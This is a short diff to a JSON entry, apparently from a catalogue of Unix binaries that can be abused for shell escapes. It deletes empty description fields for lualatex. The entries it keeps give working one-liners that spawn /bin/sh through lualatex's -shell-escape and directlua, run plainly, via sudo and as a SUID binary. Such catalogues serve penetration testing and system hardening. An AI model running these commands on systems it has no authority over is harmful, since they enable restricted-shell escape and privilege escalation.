@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'\n"
       }
     ]
